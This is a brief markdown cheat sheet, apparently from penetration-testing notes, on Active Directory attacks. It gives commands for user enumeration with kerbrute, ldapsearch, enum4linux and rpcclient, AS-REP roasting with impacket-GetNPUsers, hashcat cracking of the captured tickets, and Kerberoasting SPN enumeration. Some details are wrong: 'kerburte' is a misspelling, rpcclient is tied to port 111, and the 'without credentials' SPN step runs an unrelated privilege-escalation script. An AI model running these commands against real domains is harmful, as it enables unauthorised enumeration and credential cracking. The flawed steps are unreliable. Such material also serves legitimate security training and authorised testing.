##  Get DOMAIN-Name & Device name 
```
$ crackmapexec smb [IP] 
$ crackmapexec smb 10.10.1.12
```
###  Users fuzzing & enumeration
+ Users fuzzing
```
$ kerbrute userenum  [wordlist]  -d [DC-name] --dc [Dc-ip]
$ kerbrute userenum  /usr/share/wordlists/dirb/others/names.txt  -d test.com --dc 10.10.1.12
```
+ Users enumeration using LDAP(Port 389)
```
$ ldapsearch -H ldap://[DC-IP] -x -b [namingContexts] "(objectClass=person)" | grep "sAMAccountName:" 
$ ldapsearch -H ldap://10.10.1.12 -x -b DC=test,DC=com "(objectClass=person)" | grep "sAMAccountName:" 

```
+ Users enumeration using enum4linux
```
$ enum4linux -v [DC-ip]
$ enum4linux -v 10.10.1.12
```
+ Users enumeration using rpcclient (Port 111)
```
$ rpcclient [DC-ip] -U "" -N 
$ enumdomusers
```
## Active Directory Attacks

### [1] Non-Pre-authentication AS_REP (TGT)
```
$ impacket-GetNPUsers  [dc]/ -no-pass -u [usersname.txt]  -dc-ip [IP]  
$ impacket-GetNPUsers  test.com/ -no-pass -u users.txt  -dc-ip 10.10.1.12

# Use hashcat crack ticket
$ hashcat -m 18200 hash.txt /usr/share/wordlists/rockyou.txt
```
#### OR
```
$ kerburte --dc [ip] -d [domain_name] [user.txt] --downgrade
$ kerburte --dc 10.10.1.12 -d test.com user.txt  --downgrade

# Use hashcat crack ticket
$ hashcat -m 18200 hash.txt /usr/share/wordlists/rockyou.txt 
```

### [2] Kerberoasting SPN (TGS)
 #### [A] Enumerate servicePrincipalNames (SPN)
 + using Linux (credentials required)
 ```
$ impacket-GetUserSPNs [Domain-name]/[user]:[pass] -dc-ip [IP]
$ impacket-GetUserSPNs test.com/user:pass123 -dc-ip 10.10.1.12
 
 ```
 + using attacker machine (with out credentials)
 ```
$ powershell -ep bypass -c ". .\PrivescCheck.ps1; Invoke-PrivescCheck"
$ Get-NetUser -SPN | select serviceprincipalname
 
 ```
 
 
